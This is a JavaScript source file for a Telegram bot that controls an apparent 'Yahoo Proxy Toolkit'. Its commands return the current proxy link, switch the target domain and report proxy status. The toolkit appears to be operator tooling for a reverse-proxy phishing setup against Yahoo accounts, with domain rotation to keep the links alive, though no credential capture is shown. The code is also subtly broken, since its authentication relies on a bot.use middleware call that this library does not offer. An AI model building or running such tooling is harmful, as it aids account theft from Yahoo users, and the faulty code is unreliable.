import TelegramBot from 'node-telegram-bot-api';
import { Config } from '../utils/config-manager.js';
import Logger from '../utils/logger.js';
import ProxyManager from '../core/proxy-manager.js';

class TelegramWebhook {
    constructor() {
        this.config = new Config();
        this.logger = new Logger();
        this.proxyManager = new ProxyManager();

        // Get Telegram bot token
        this.token = this.config.get('telegram.bot_token');
        this.allowedUsers = this.config.get('telegram.allowed_users', []);

        // Initialize bot
        this.bot = new TelegramBot(this.token, { polling: true });

        // Setup command handlers
        this.setupCommandHandlers();
    }

    setupCommandHandlers() {
        // Authentication middleware
        this.bot.use(this.authenticateUser.bind(this));

        // Command handlers
        this.bot.onText(/\/start/, this.handleStart.bind(this));
        this.bot.onText(/\/getlink/, this.handleGetLink.bind(this));
        this.bot.onText(/\/changedomain (.+)/, this.handleChangeDomain.bind(this));
        this.bot.onText(/\/status/, this.handleStatus.bind(this));
    }

    authenticateUser(msg, next) {
        const userId = msg.from.id;
        if (!this.allowedUsers.includes(userId)) {
            this.bot.sendMessage(msg.chat.id, '🚫 Unauthorized access');
            return;
        }
        next();
    }

    async handleStart(msg) {
        const chatId = msg.chat.id;
        const welcomeMessage = `
🔒 Yahoo Proxy Toolkit Bot
Available Commands:
/getlink - Get current proxy link
/changedomain <domain> - Change target domain
/status - Get current proxy status
        `;
        
        await this.bot.sendMessage(chatId, welcomeMessage);
    }

    async handleGetLink(msg) {
        const chatId = msg.chat.id;
        try {
            const currentLink = this.proxyManager.getCurrentLink();
            await this.bot.sendMessage(chatId, `🔗 Current Proxy Link: ${currentLink}`);
        } catch (error) {
            await this.bot.sendMessage(chatId, `❌ Error: ${error.message}`);
        }
    }

    async handleChangeDomain(msg, match) {
        const chatId = msg.chat.id;
        const newDomain = match[1];

        try {
            await this.proxyManager.changeDomain(newDomain);
            await this.bot.sendMessage(chatId, `✅ Domain changed to: ${newDomain}`);
        } catch (error) {
            await this.bot.sendMessage(chatId, `❌ Domain change failed: ${error.message}`);
        }
    }

    async handleStatus(msg) {
        const chatId = msg.chat.id;
        try {
            const status = await this.proxyManager.getStatus();
            const statusMessage = `
🟢 Proxy Status:
- Domain: ${status.domain}
- Server: ${status.server}
- Uptime: ${status.uptime}
            `;
            
            await this.bot.sendMessage(chatId, statusMessage);
        } catch (error) {
            await this.bot.sendMessage(chatId, `❌ Status retrieval failed: ${error.message}`);
        }
    }

    async start() {
        this.logger.info('Telegram Webhook Bot Started');
    }
}

export default TelegramWebhook;